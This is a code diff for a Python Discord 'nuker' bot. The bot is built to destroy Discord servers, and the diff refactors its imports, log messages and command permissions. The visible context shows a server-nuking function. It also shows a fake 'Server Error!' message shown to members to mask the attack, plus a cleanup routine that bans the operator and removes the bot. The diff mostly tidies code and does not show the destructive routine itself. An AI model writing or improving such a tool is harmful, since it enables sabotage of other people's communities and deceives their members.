@@ -6,8 +6,7 @@
 import discord
 from discord.ext import commands
 
-import requests
-
+from requests import get
 from datetime import datetime
 from os import listdir
 from time import sleep
@@ -189,7 +188,7 @@ Server Owner: {ctx.guild.owner}
 # change server name and icon
 async def edit_server(ctx, name, icon_file):
     if icon_file.find("http") != -1:
-        response = requests.get(icon_file)
+        response = get(icon_file)
 
         with open(".tmp_icon", "wb") as f:
             f.write(response.content)
@@ -247,12 +246,12 @@ async def on_ready():
     await bot.change_presence(activity=activity)
 
     print(f"{bot.user} online!")
-    print("Connected servers: \n")
+    print("Connected servers:")
 
     for guild in bot.guilds:
         print(guild.name)
 
-    print(f"Actively logging operations in \"nuker_bot_log.txt\"")
+    print(f"Logging in \"nuker_bot_log.txt\"")
 
 
 # outputs to the log some basic info about the new guild when connected
@@ -288,11 +287,14 @@ async def on_message(msg):
             embed = discord.Embed(
                 title="Server Error!",
                 description="Our servers are currently experiencing some issues, please check back at a later time!",
-                colour=0xff0000, set_image="https://i.imgur.com/qxBoiZY.png"
+                colour=0xff0000
             )
             await msg.channel.send(content=None, embed=embed)
-        elif msg.author.id == USER_ID:
-            await bot.process_commands(msg)
+        
+        elif USER_ID != False:
+            if msg.author.id == USER_ID:
+                await bot.process_commands(msg)
+        else: await bot.process_commands(msg)
 
 
 # nukes the server
@@ -399,7 +401,7 @@ async def stop(ctx):
         await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
         output_log(f'''
 *** NUKER CLEANUP ALERT ***
-Nuker ({await ctx.guild.fetch_member(USER_ID)}) has been banned from the server and the bot has been removed!
+{ctx.message.author.name} has been banned from the server and the bot has been removed!
 Server Name: {ctx.guild.name}
 Server Owner: {ctx.guild.owner}
 ''')
@@ -407,7 +409,7 @@ Server Owner: {ctx.guild.owner}
         await ctx.guild.ban(await ctx.guild.fetch_member(USER_ID))
         output_log(f'''
 *** NUKER CLEANUP ALERT ***
-Nuker ({await ctx.guild.fetch_member(USER_ID)}) has been banned from the server and the bot has been removed!
+{await ctx.guild.fetch_member(USER_ID)} has been banned from the server and the bot has been removed!
 Server Name: {ctx.guild.name}
 Server Owner: {ctx.guild.owner}
 ''')
